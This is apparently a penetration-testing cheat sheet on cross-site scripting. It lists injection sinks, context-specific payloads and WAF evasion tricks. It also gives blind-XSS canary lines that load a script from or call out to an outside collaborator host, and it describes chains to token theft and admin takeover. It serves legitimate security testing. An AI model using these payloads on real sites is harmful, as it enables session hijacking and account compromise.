# XSS (Cross-Site Scripting)

## Attack Surface Signals
- **Reflected Sinks**: Search fields, filter params, error messages, user pagination, status banners, OAuth error queries.
- **Stored Sinks**: User profile attributes (name, bio, company), comment systems, support tickets, file names, chat messages, markdown renderers.
- **DOM Sinks**: `element.innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `location.href`, `script.src`.

## Context-Specific Payloads & Bypasses
1. **HTML Body Context**:
   - `<script>alert(1)</script>`
   - `<img src=x onerror=alert(1)>`
   - `<svg onload=alert(1)>`
   - `<details open ontoggle=alert(1)>`
   - `<iframe src="javascript:alert(1)">`
2. **HTML Attribute Context**:
   - `"><script>alert(1)</script>`
   - `" onfocus=alert(1) autofocus="`
   - `" onmouseover=alert(1) "`
   - `javascript:alert(1)` (inside `href`, `src`, `action`)
3. **JavaScript String Context**:
   - `';alert(1)//` or `"-alert(1)-"`
   - `</script><script>alert(1)</script>` (breaks enclosing `<script>` tag)
   - Template literals: `${alert(1)}`
4. **WAF & Filter Evasion**:
   - Case modification & whitespace: `<sCrIpt/x>`, `<img/src=x/onerror=alert(1)>`
   - Tag/Event permutation: `<body onpageshow=alert(1)>`, `<video><source onerror=alert(1)>`
   - Function call alternatives: `confirm()`, `prompt()`, `top['al'+'ert'](1)`, `[1].map(alert)`
   - HTML entity encoding inside attributes: `<a href="jav&#x61;script:alert(1)">`

## Stored & Blind XSS Methodology
- Plant distinctive canary payloads: `"><script src="https://interactsh.com/x.js"></script>` or `"><img src=x onerror=fetch('//collab-id')>`
- Test administrative backends: Support tickets, KYC document names, user-agent logs, webhook payloads.

## Common Root Causes
- Direct string interpolation into HTML templates without context-aware escaping.
- Trusting sanitized user markdown or rich-text HTML inputs without rigorous DOMPurify enforcement.
- DOM sink consumption of `location.hash` or `window.name` without sanitization.

## Exploit Chains
- **Stored XSS → Session Hijacking**: Exfiltrating non-HttpOnly session tokens / localStorage JWTs.
- **XSS → Anti-CSRF Token Extraction + Forced State Change**: Fetching CSRF token and modifying administrative settings.
- **Reflected XSS + Cache Poisoning → Persistent Mass XSS**: Poisoning CDN edge cache with reflected payload.
